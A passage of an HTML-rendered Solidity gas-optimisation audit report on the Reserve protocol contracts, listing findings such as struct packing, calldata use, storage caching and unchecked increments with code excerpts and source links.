mapping(32):_nonces, uint256(32):rsrRewardsAtLastPayout, uint192(24):stakeRate, uint48(6):unstakingDelay, uint192(24):draftRate, uint48(6):rewardPeriod, uint192(24):rewardRatio, uint48(6):payoutLastPaid, address(20):assetRegistry, address(20):backingManager, address(20):basketHandler, user-defined(20):rsr</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">42</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">name</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// mutable</span></span></span></code></pre>\n<p><a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L42\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L42</a></p>\n<h2 id=\"g05-structs-can-be-packed-into-fewer-storage-slots\" style=\"position:relative;\"><a href=\"#g05-structs-can-be-packed-into-fewer-storage-slots\" aria-label=\"g05 structs can be packed into fewer storage slots permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑05] Structs can be packed into fewer storage slots</h2>\n<p>Each slot saved can avoid an extra Gsset (<strong>20000 gas</strong>) for the first setting of the struct. Subsequent reads as well as writes have smaller gas savings.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"119\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">IGnosis</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Variable ordering with 11 slots instead of the current 12:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">///           uint256(32):orderCancellationEndDate, uint256(32):auctionEndDate, bytes32(32):initialAuctionOrder, uint256(32):minimumBiddingAmountPerOrder, uint256(32):interimSumBidAmount, bytes32(32):interimOrder, bytes32(32):clearingPriceOrder, uint256(32):feeNumerator, uint256(32):minFundingThreshold, user-defined(20):auctioningToken, uint96(12):volumeClearingPriceOrder, user-defined(20):biddingToken, bool(1):minFundingThresholdNotReached, bool(1):isAtomicClosureAllowed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">6</span><span class=\"mtk1\">     </span><span class=\"mtk12\">struct</span><span class=\"mtk1\"> </span><span class=\"mtk12\">GnosisAuctionData</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">7</span><span class=\"mtk1\">         </span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">auctioningToken</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">8</span><span class=\"mtk1\">         </span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">biddingToken</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">9</span><span class=\"mtk1\">         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">orderCancellationEndDate</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">10</span><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">auctionEndDate</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">11</span><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">initialAuctionOrder</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">12</span><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minimumBiddingAmountPerOrder</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">13</span><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">interimSumBidAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">14</span><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">interimOrder</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">15</span><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">clearingPriceOrder</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">16</span><span class=\"mtk1\">        </span><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">volumeClearingPriceOrder</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">17</span><span class=\"mtk1\">        </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minFundingThresholdNotReached</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">18</span><span class=\"mtk1\">        </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">isAtomicClosureAllowed</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">19</span><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feeNumerator</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">20</span><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minFundingThreshold</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">21</span><span class=\"mtk1\">:   }</span></span></span></code></pre>\n<p><a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/interfaces/IGnosis.sol#L6-L21\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/interfaces/IGnosis.sol#L6-L21</a></p>\n<h2 id=\"g06-using-calldata-instead-of-memory-for-read-only-arguments-in-external-functions-saves-gas\" style=\"position:relative;\"><a href=\"#g06-using-calldata-instead-of-memory-for-read-only-arguments-in-external-functions-saves-gas\" aria-label=\"g06 using calldata instead of memory for read only arguments in external functions saves gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑06] Using <code>calldata</code> instead of <code>memory</code> for read-only arguments in <code>external</code> functions saves gas</h2>\n<p>When a function with a <code>memory</code> array is called externally, the <code>abi.decode()</code> step has to use a for-loop to copy each index of the <code>calldata</code> to the <code>memory</code> index. <strong>Each iteration of this for-loop costs at least 60 gas</strong> (i.e. <code>60 * &#x3C;mem_array>.length</code>). Using <code>calldata</code> directly, obliviates the need for such a loop in the contract code and runtime execution. Note that even if an interface defines a function as having <code>memory</code> arguments, it’s still valid for implementation contracs to use <code>calldata</code> arguments instead. </p>\n<p>If the array is passed to an <code>internal</code> function which passes the array to another internal function where the array is modified and therefore <code>memory</code> is used in the <code>external</code> call, it’s still more gass-efficient to use <code>calldata</code> when the <code>external</code> function uses modifiers, since the modifiers may prevent the internal functions from being called. Structs have the same overhead as an array of length one.</p>\n<p>Note that I’ve also flagged instances where the function is <code>public</code> but can be marked as <code>external</code> since it’s not called by the contract, and cases where a constructor is involved.</p>\n<p><em>There are 8 instances of this issue.</em></p>\n<h2 id=\"g07-using-storage-instead-of-memory-for-structsarrays-saves-gas\" style=\"position:relative;\"><a href=\"#g07-using-storage-instead-of-memory-for-structsarrays-saves-gas\" aria-label=\"g07 using storage instead of memory for structsarrays saves gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑07] Using <code>storage</code> instead of <code>memory</code> for structs/arrays saves gas</h2>\n<p>When fetching data from a storage location, assigning the data to a <code>memory</code> variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (<strong>2100 gas</strong>) for <em>each</em> field of the struct/array. If the fields are read from the new memory variable, they incur an additional <code>MLOAD</code> rather than a cheap stack read. Instead of declearing the variable with the <code>memory</code> keyword, declaring the variable with the <code>storage</code> keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a <code>memory</code> variable, is if the full struct/array is being returned by the function, is being passed to a function that requires <code>memory</code>, or if the array/struct is being read from another <code>memory</code> array/struct.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"120\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Distributor</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">134</span><span class=\"mtk1\">:              </span><span class=\"mtk12\">Transfer</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">t</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">transfers</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">];</span></span></span></code></pre>\n<p><a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/Distributor.sol#L134\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/Distributor.sol#L134</a></p>\n<h2 id=\"g08-avoid-contract-existence-checks-by-using-low-level-calls\" style=\"position:relative;\"><a href=\"#g08-avoid-contract-existence-checks-by-using-low-level-calls\" aria-label=\"g08 avoid contract existence checks by using low level calls permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑08] Avoid contract existence checks by using low level calls</h2>\n<p>Prior to 0.8.10 the compiler inserted extra code, including <code>EXTCODESIZE</code> (<strong>100 gas</strong>), to check for contract existence for external function calls. In more recent solidity versions, the compiler will not insert these checks if the external call has a return value. Similar behavior can be achieved in earlier versions by using low-level calls, since low level calls never check for contract existence.</p>\n<p><em>There are 67 instances of this issue.</em></p>\n<h2 id=\"g09-state-variables-should-be-cached-in-stack-variables-rather-than-re-reading-them-from-storage\" style=\"position:relative;\"><a href=\"#g09-state-variables-should-be-cached-in-stack-variables-rather-than-re-reading-them-from-storage\" aria-label=\"g09 state variables should be cached in stack variables rather than re reading them from storage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑09] State variables should be cached in stack variables rather than re-reading them from storage</h2>\n<p>The instances below point to the second+ access of a state variable within a function. Caching of a state variable replaces each Gwarmaccess (<strong>100 gas</strong>) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.</p>\n<p><em>There are 60 instances of this issue.</em></p>\n<h2 id=\"g10-multiple-accesses-of-a-mappingarray-should-use-a-local-variable-cache\" style=\"position:relative;\"><a href=\"#g10-multiple-accesses-of-a-mappingarray-should-use-a-local-variable-cache\" aria-label=\"g10 multiple accesses of a mappingarray should use a local variable cache permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑10] Multiple accesses of a mapping/array should use a local variable cache</h2>\n<p>The instances below point to the second+ access of a value inside a mapping/array, within a function. Caching a mapping’s value in a local <code>storage</code> or <code>calldata</code> variable when the value is accessed <a href=\"https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0\">multiple times</a>, saves <strong>~42 gas per access</strong> due to not having to recalculate the key’s keccak256 hash (Gkeccak256 - <strong>30 gas</strong>) and that calculation’s associated stack operations. Caching an array’s struct avoids recalculating the array offsets into memory/calldata.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"121\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit issueQueues[account] on line 635</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">635</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">issueQueues</span><span class=\"mtk1\">[</span><span class=\"mtk12\">account</span><span class=\"mtk1\">].</span><span class=\"mtk12\">left</span><span class=\"mtk1\">, </span><span class=\"mtk12\">issueQueues</span><span class=\"mtk1\">[</span><span class=\"mtk12\">account</span><span class=\"mtk1\">].</span><span class=\"mtk12\">right</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L635\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L635</a></p>\n<h2 id=\"g11-the-result-of-function-calls-should-be-cached-rather-than-re-calling-the-function\" style=\"position:relative;\"><a href=\"#g11-the-result-of-function-calls-should-be-cached-rather-than-re-calling-the-function\" aria-label=\"g11 the result of function calls should be cached rather than re calling the function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑11] The result of function calls should be cached rather than re-calling the function</h2>\n<p>The instances below point to the second+ call of the function within a single function.</p>\n<p><em>There are 12 instances of this issue.</em></p>\n<h2 id=\"g12-x--y-costs-more-gas-than-x--x--y-for-state-variables\" style=\"position:relative;\"><a href=\"#g12-x--y-costs-more-gas-than-x--x--y-for-state-variables\" aria-label=\"g12 x  y costs more gas than x  x  y for state variables permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑12] <code>&#x3C;x> += &#x3C;y></code> costs more gas than <code>&#x3C;x> = &#x3C;x> + &#x3C;y></code> for state variables</h2>\n<p>Using the addition operator instead of plus-equals saves <strong><a href=\"https://gist.github.com/IllIllI000/cbbfb267425b898e5be734d4008d4fe8\">113 gas</a></strong>.</p>\n<p><em>There are 10 instances of this issue.</em></p>\n<h2 id=\"g13-internal-functions-only-called-once-can-be-inlined-to-save-gas\" style=\"position:relative;\"><a href=\"#g13-internal-functions-only-called-once-can-be-inlined-to-save-gas\" aria-label=\"g13 internal functions only called once can be inlined to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑13] <code>internal</code> functions only called once can be inlined to save gas</h2>\n<p>Not inlining costs <strong>20 to 40 gas</strong> because of two extra <code>JUMP</code> instructions and additional stack operations needed for function calls.</p>\n<p><em>There are 2 instances of this issue.</em></p>\n<h2 id=\"g14-add-unchecked--for-subtractions-where-the-operands-cannot-underflow-because-of-a-previous-require-or-if-statement\" style=\"position:relative;\"><a href=\"#g14-add-unchecked--for-subtractions-where-the-operands-cannot-underflow-because-of-a-previous-require-or-if-statement\" aria-label=\"g14 add unchecked  for subtractions where the operands cannot underflow because of a previous require or if statement permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑14] Add <code>unchecked {}</code> for subtractions where the operands cannot underflow because of a previous <code>require()</code> or <code>if</code>-statement</h2>\n<p><code>require(a &#x3C;= b); x = b - a</code> => <code>require(a &#x3C;= b); unchecked { x = b - a }</code></p>\n<p><em>There are 6 instances of this issue.</em></p>\n<h2 id=\"g15-ii-should-be-uncheckediuncheckedi-when-it-is-not-possible-for-them-to-overflow-as-is-the-case-when-used-in-for--and-while-loops\" style=\"position:relative;\"><a href=\"#g15-ii-should-be-uncheckediuncheckedi-when-it-is-not-possible-for-them-to-overflow-as-is-the-case-when-used-in-for--and-while-loops\" aria-label=\"g15 ii should be uncheckediuncheckedi when it is not possible for them to overflow as is the case when used in for  and while loops permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑15] <code>++i</code>/<code>i++</code> should be <code>unchecked{++i}</code>/<code>unchecked{i++}</code> when it is not possible for them to overflow, as is the case when used in <code>for</code>- and <code>while</code>-loops</h2>\n<p>The <code>unchecked</code> keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves <strong>30-40 gas <a href=\"https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#the-increment-in-for-loop-post-condition-can-be-made-unchecked\">per loop</a></strong>.</p>\n<p><em>There are 51 instances of this issue.</em></p>\n<h2 id=\"g16-requirerevert-strings-longer-than-32-bytes-cost-extra-gas\" style=\"position:relative;\"><a href=\"#g16-requirerevert-strings-longer-than-32-bytes-cost-extra-gas\" aria-label=\"g16 requirerevert strings longer than 32 bytes cost extra gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑16] <code>require()</code>/<code>revert()</code> strings longer than 32 bytes cost extra gas</h2>\n<p>Each extra memory word of bytes past the original 32 <a href=\"https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#consider-having-short-revert-strings\">incurs an MSTORE</a> which costs <strong>3 gas</strong>.</p>\n<p><em>There are 2 instances of this issue.</em></p>\n<h2 id=\"g17-optimize-names-to-save-gas\" style=\"position:relative;\"><a href=\"#g17-optimize-names-to-save-gas\" aria-label=\"g17 optimize names to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑17] Optimize names to save gas</h2>\n<p><code>public</code>/<code>external</code> function names and <code>public</code> member variable names can be optimized to save gas. See <a href=\"https://gist.github.com/IllIllI000/a5d8b486a8259f9f77891a919febd1a9\">this</a> link for an example of how it works. Below are the interfaces/abstract contracts that can be optimized so that the most frequently-called functions use the least amount of gas possible during method lookup. Method IDs that have two leading zero bytes can save <strong>128 gas</strong> each during deployment, and renaming functions to have lower method IDs will save <strong>22 gas</strong> per call, <a href=\"https://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92\">per sorted position shifted</a>.</p>\n<p><em>There are 49 instances of this issue.</em></p>\n<h2 id=\"g18-use-a-more-recent-version-of-solidity\" style=\"position:relative;\"><a href=\"#g18-use-a-more-recent-version-of-solidity\" aria-label=\"g18 use a more recent version of solidity permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 